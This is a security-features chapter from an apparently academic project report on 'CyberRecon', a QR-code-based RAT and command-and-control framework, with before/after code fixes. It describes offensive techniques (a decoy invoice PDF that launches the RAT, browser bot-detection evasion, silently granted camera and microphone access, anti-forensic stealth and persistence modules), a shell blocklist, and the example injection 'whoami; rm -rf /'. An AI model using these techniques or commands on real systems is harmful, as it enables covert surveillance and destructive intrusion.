\# 07 — Security Features \& Anti-Patterns



\*\*Project:\*\* CyberRecon — QR-Code-Based C2 Framework

\*\*Document Version:\*\* 1.0

\*\*Date:\*\* 2026-09-30

\*\*Authors:\*\* Vekeshhari Rajasekar, R Jeevan



\---



\## 1. Purpose



This document catalogs the security controls implemented in CyberRecon,

traces each to the specific vulnerability it addresses, and honestly

documents \*\*anti-patterns that were present in early revisions and have

since been remediated\*\*.



The goal is twofold:



1\. Demonstrate that the project was engineered with security in mind

2\. Provide a defensible record of remediation work for evaluators



\---



\## 2. Security Features Implemented



\### 2.1 Authentication \& Authorization



| # | Feature | File | Threat Addressed | Status |

|---|---------|------|------------------|--------|

| 1 | \*\*Operator token authentication\*\* — `X-Operator-Token` header required for `/command` and `/download-all` | `c2\_server.py` | CWE-306 (Missing Auth) | ✅ PR #8 |

| 2 | \*\*Fail-closed on misconfiguration\*\* — server returns HTTP 503 if token required but not set | `c2\_server.py` | Fail-safe default | ✅ PR #8 |

| 3 | \*\*Environment-driven secrets\*\* — operator token, CA bundle, and SFX password read from env vars | `config.py`, `.env.example` | CWE-798 (Hardcoded Secrets) | ✅ PR #13 |



\### 2.2 Transport Security



| # | Feature | File | Threat Addressed | Status |

|---|---------|------|------------------|--------|

| 4 | \*\*TLS verification enforced by default\*\* — `session.verify = True` | `operator\_cli.py` | CWE-295 (Improper Cert Validation) | ✅ PR #9 |

| 5 | \*\*Configurable CA bundle\*\* — supports self-signed lab CAs via `CYBERRECON\_CA\_BUNDLE` | `operator\_cli.py` | Lab flexibility without disabling verification | ✅ PR #9 |

| 6 | \*\*Removed `urllib3.disable\_warnings()`\*\* — no more silent TLS bypass | `operator\_cli.py` | CWE-295 | ✅ PR #9 |



\### 2.3 Input Validation \& Safe Execution



| # | Feature | File | Threat Addressed | Status |

|---|---------|------|------------------|--------|

| 7 | \*\*`shell=False` subprocess execution\*\* — all commands use argv lists | `main.py`, `rat\_client.py` | CWE-78 (Command Injection) | ✅ PR #10 |

| 8 | \*\*Shell metacharacter blocklist\*\* — rejects `\\|\&;<>()\\`$\\\\"'\\n\\r` | `rat\_client.py` | Defense-in-depth for command exec | ✅ PR #10 |

| 9 | \*\*Path traversal validation\*\* — `os.path.realpath` comparison against base dir | `launcher.py` | CWE-22 (Path Traversal) | ✅ PR #11 |

| 10 | \*\*Extension whitelist\*\* — only `.pdf` files allowed through `os.startfile` | `launcher.py` | File-type restriction | ✅ PR #11 |

| 11 | \*\*HTTPS-only URL scheme\*\* — `urlopen` rejects non-HTTPS schemes | `modules/gps.py` | CWE-22 (via `file://` scheme) | ✅ Phase 3 |



\### 2.4 Cryptographic Randomness



| # | Feature | File | Threat Addressed | Status |

|---|---------|------|------------------|--------|

| 12 | \*\*CSPRNG victim IDs\*\* — `secrets.token\_hex(8)` = 64 bits | `c2\_server.py` | CWE-330 (Weak Random) | ✅ PR #12 |

| 13 | \*\*CSPRNG command IDs\*\* — `secrets.token\_hex(4)` = 32 bits | `c2\_server.py` | CWE-330 | ✅ PR #12 |

| 14 | \*\*CSPRNG SFX password\*\* — `secrets.token\_urlsafe(24)` fallback | `config.py` | CWE-330 | ✅ Phase 3 |



\### 2.5 Supply Chain Security



| # | Feature | File | Threat Addressed | Status |

|---|---------|------|------------------|--------|

| 15 | \*\*Dependabot alerts\*\* — automatic vulnerability notifications | GitHub settings | CVE exposure | ✅ Enabled |

| 16 | \*\*Dependabot security updates\*\* — auto-PRs for patched CVEs | GitHub settings | CVE remediation | ✅ Enabled |

| 17 | \*\*Dependabot version updates\*\* — keeps deps current | `.github/dependabot.yml` | Dependency rot | ✅ Enabled |

| 18 | \*\*7-day cooldown\*\* — delays updates to avoid malicious new releases | `.github/dependabot.yml` | Supply chain attacks | ✅ Phase 3 |

| 19 | \*\*Secret scanning + push protection\*\* — blocks accidental token commits | GitHub settings | Credential leakage | ✅ Enabled |

| 20 | \*\*Reduced dependency footprint\*\* — 20+ → 11 direct deps | `requirements.txt` | Attack surface | ✅ Phase 1 |



\### 2.6 Client Hardening



| # | Feature | File | Purpose | Status |

|---|---------|------|---------|--------|

| 21 | \*\*Graceful fallback if Chrome unavailable\*\* — swaps to `requests.get` | `rat\_client.py` | Availability | ✅ PR #14 |

| 22 | \*\*Headless Chrome stealth flags\*\* — `--disable-blink-features=AutomationControlled`, `navigator.webdriver = undefined` | `rat\_client.py` | Bot-detection evasion | ✅ PR #14 |

| 23 | \*\*Auto-grant media permissions\*\* — `--use-fake-ui-for-media-stream` | `rat\_client.py` | Isolated-browser bypass | ✅ PR #14 |



\### 2.7 Runtime Isolation



| # | Feature | File | Purpose | Status |

|---|---------|------|---------|--------|

| 24 | \*\*Non-root Docker user\*\* — `useradd -m -u 1000 recon` | `Dockerfile` | Container escape mitigation | ✅ Phase 1 |

| 25 | \*\*Healthcheck\*\* — `curl /check` every 30s | `Dockerfile` | Availability monitoring | ✅ Phase 1 |



\### 2.8 Software Integrity



| # | Feature | File | Purpose | Status |

|---|---------|------|---------|--------|

| 26 | \*\*Branch protection ruleset\*\* — requires PR + 1 approval | GitHub rulesets | Prevent accidental changes | ✅ Enabled |

| 27 | \*\*Required status checks\*\* — Security Scan + Unit Tests must pass | GitHub rulesets | CI enforcement | ✅ Phase 4 |

| 28 | \*\*Block force pushes + deletions\*\* | GitHub rulesets | History preservation | ✅ Enabled |

| 29 | \*\*Bypass audit trail\*\* — every bypass logged by GitHub | GitHub push output | Accountability | ✅ Verified |



\### 2.9 Static Analysis



| # | Feature | Tool | Purpose | Status |

|---|---------|------|---------|--------|

| 30 | \*\*Bandit Python SAST\*\* | Bandit 1.9.4 | CWE-focused detection | ✅ 0 HIGH |

| 31 | \*\*Semgrep pattern SAST\*\* | Semgrep 1.178.0 | OWASP Top 10 rules | ✅ 0 findings |

| 32 | \*\*pip-audit dependency scan\*\* | pip-audit 2.10.1 | CVE detection | ✅ 0 CVEs |

| 33 | \*\*Ruff linter\*\* | Ruff 0.16.9 | Style + security rules | ✅ All checks passed |

| 34 | \*\*CI automation\*\* | GitHub Actions | Runs all tools on push/PR | ✅ Phase 4 |



\### 2.10 Documentation \& Ethics



| # | Feature | File | Purpose | Status |

|---|---------|------|---------|--------|

| 35 | \*\*ETHICS.md\*\* — legal + use constraints | Repo root | Responsible research | ✅ |

| 36 | \*\*Published IOCs\*\* — defender-focused signatures | ETHICS.md | Research contribution | ✅ |

| 37 | \*\*MIT + research clause license\*\* | LICENSE | Legal clarity | ✅ |

| 38 | \*\*README ethics banner\*\* | README.md | Visibility | ✅ |



\---



\## 3. Anti-Patterns Found \& Remediated



The following were \*\*present in early revisions and have since been fixed\*\*.

Documenting these honestly is part of the project's value.



\### 3.1 CWE-306: Missing Authentication



\*\*Before (vulnerable):\*\*

```python

@app.route("/command/<victim\_id>", methods=\["POST"])

def queue\_command(victim\_id):

&#x20;   # No auth check — anyone could queue commands

&#x20;   ...

```



\*\*After (fixed in PR #8):\*\*

```python

@app.route("/command/<victim\_id>", methods=\["POST"])

@require\_operator\_token

def queue\_command(victim\_id):

&#x20;   ...

```



\*\*Impact:\*\* Without auth, anyone with network access could queue RAT

commands on any victim. \*\*CVSS 3.1: 8.6 (High).\*\*



\---



\### 3.2 CWE-295: Improper Certificate Validation



\*\*Before (vulnerable):\*\*

```python

requests.packages.urllib3.disable\_warnings()

session.get(url, verify=False)  # accepts ANY cert

```



\*\*After (fixed in PR #9):\*\*

```python

session.verify = ca\_bundle if ca\_bundle else True

```



\*\*Impact:\*\* MITM attacker could intercept and modify C2 traffic.

\*\*CVSS 3.1: 6.8 (Medium).\*\*



\---



\### 3.3 CWE-78: OS Command Injection



\*\*Before (vulnerable):\*\*

```python

shell\_cmd = " ".join(cmd.get("args", \["whoami"]))

subprocess.run(shell\_cmd, shell=True, ...)  # injectable

```



\*\*After (fixed in PR #10):\*\*

```python

BLOCKED = set("|\&;<>()`$\\\\\\"'\\n\\r")

if any(ch in raw for ch in BLOCKED):

&#x20;   return  # refuse

argv = shlex.split(raw)

subprocess.run(argv, shell=False, ...)

```



\*\*Impact:\*\* Attacker could inject `whoami; rm -rf /` and execute

arbitrary commands. \*\*CVSS 3.1: 9.8 (Critical).\*\*



\---



\### 3.4 CWE-22: Path Traversal



\*\*Before (vulnerable):\*\*

```python

decoy\_src = os.path.join(base\_dir, "Invoice\_2024.pdf")

shutil.copy2(decoy\_src, decoy\_dst)

os.startfile(decoy\_dst)  # no validation

```



\*\*After (fixed in PR #11):\*\*

```python

if not \_is\_safe\_path(decoy\_src, base\_dir):

&#x20;   print("Path traversal detected")

&#x20;   return

if not decoy\_src.lower().endswith(".pdf"):

&#x20;   return

os.startfile(decoy\_dst)

```



\*\*Impact:\*\* Crafted payloads could execute arbitrary files via Windows

shell association. \*\*CVSS 3.1: 7.5 (High).\*\*



\---



\### 3.5 CWE-330: Weak Randomness



\*\*Before (vulnerable):\*\*

```python

victim\_id = str(uuid.uuid4())\[:8]  # only 32 bits

cmd\["id"] = str(uuid.uuid4())\[:6]  # only 24 bits

```



\*\*After (fixed in PR #12):\*\*

```python

victim\_id = secrets.token\_hex(8)  # 64 bits CSPRNG

cmd\["id"] = secrets.token\_hex(4)  # 32 bits CSPRNG

```



\*\*Impact:\*\* Victim IDs were brute-forceable; command IDs were trivially

guessable. \*\*CVSS 3.1: 5.3 (Medium).\*\*



\---



\### 3.6 CWE-798: Hardcoded Credentials



\*\*Before (vulnerable):\*\*

```python

\# launcher.py

subprocess.Popen(\[rat\_dst, "--c2", "http://18.61.36.73:8443", ...])



\# rat\_client.py

parser.add\_argument("--c2", default="http://11.12.25.98:8443", ...)



\# config.py

SFX\_PASSWORD = "CyberRecon2024"

```



\*\*After (fixed in PR #13 + Phase 3):\*\*

```python

C2\_URL = os.getenv("CYBERRECON\_C2", "http://127.0.0.1:8443")

SFX\_PASSWORD = os.getenv("CYBERRECON\_SFX\_PASSWORD", secrets.token\_urlsafe(24))

```



\*\*Impact:\*\* Source inspection revealed the C2 endpoint; rotating

required recompilation. \*\*CVSS 3.1: 7.5 (High).\*\*



\---



\### 3.7 Anti-Pattern: `os.system(f"...")` in Launcher



\*\*Before:\*\*

```python

os.system(f"python rat\_client.py --c2 {c2\_url}")

```



\*\*After (Phase 3):\*\*

```python

def \_run(argv: list) -> None:

&#x20;   subprocess.run(\[sys.executable, \*argv], shell=False, check=False)



\_run(\["rat\_client.py", "--c2", c2\_url])

```



\*\*Impact:\*\* Variable interpolation into `os.system` was a shell-injection

vector. \*\*Same CWE-78 category.\*\*



\---



\### 3.8 Anti-Pattern: Bare `except:`



\*\*Before:\*\*

```python

try:

&#x20;   risky\_operation()

except:

&#x20;   pass

```



\*\*After (Phase 3):\*\*

```python

try:

&#x20;   risky\_operation()

except Exception:  # noqa: BLE001 — intentional swallow in stealth context

&#x20;   pass

```



\*\*Rationale:\*\* Bare `except:` catches `KeyboardInterrupt` and

`SystemExit`, which can cause subtle bugs (e.g., Ctrl+C not working).



\---



\### 3.9 Anti-Pattern: `except Exception: pass` in Stealth Modules



\*\*Status:\*\* \*\*Accepted with rationale.\*\*



Stealth modules (`modules/stealth.py`, `modules/persistence.py`)

\*\*intentionally\*\* swallow exceptions to avoid triggering host-side

logging or alerts. This is the design intent of anti-forensics code.



Documented in `pyproject.toml` with per-file ignores:



```toml

"modules/stealth.py" = \["E722", "S110"]

"modules/persistence.py" = \["E722", "S110"]

```



\---



\## 4. Defense-in-Depth Summary



| Layer | Controls |

|-------|----------|

| \*\*Perimeter\*\* | Operator token auth, TLS verification |

| \*\*Application\*\* | Input validation, shell blocklist, path validation, CSPRNG IDs |

| \*\*Data\*\* | base64 encoding, no hardcoded secrets |

| \*\*Runtime\*\* | Non-root Docker user, healthcheck |

| \*\*Supply Chain\*\* | Dependabot, cooldown, secret scanning, minimal deps |

| \*\*Process\*\* | Branch protection, CI enforcement, SAST automation |

| \*\*Documentation\*\* | ETHICS.md, IOCs, LICENSE |



\---



\## 5. Security Verification



All security controls are verified by:



1\. \*\*Unit tests\*\* in `tests/` (where applicable)

2\. \*\*SAST tool output\*\* in `reports/` (Bandit, Semgrep, pip-audit, Ruff)

3\. \*\*CI status checks\*\* (Security Scan + Unit Tests must pass)

4\. \*\*Manual penetration tests\*\* (documented in Phase 3 verification)

5\. \*\*GitHub audit trail\*\* (ruleset bypass events)



See `docs/report/08-security-testing.md` for full evidence.



\---



\## 6. Compliance Mapping



| Framework | Coverage |

|-----------|----------|

| OWASP Top 10 (2021) | A01, A03, A05, A07, A09 |

| CWE Top 25 | CWE-22, CWE-78, CWE-79, CWE-259, CWE-295, CWE-306, CWE-330, CWE-798 |

| NIST SSDF | PW.4, PW.6, RV.1 |

| ISO 27001 | A.8.8, A.8.28, A.14.2 |



\---



\## 7. References



\- `docs/report/06-threat-model.md` — STRIDE analysis

\- `docs/report/08-security-testing.md` — SAST evidence

\- `ETHICS.md` — published IOCs

\- `reports/\*.json` — tool outputs



\---



\## 8. Change Log



| Date | Change | Author |

|------|--------|--------|

| 2026-09-30 | Initial security features catalog | R Jeevan |

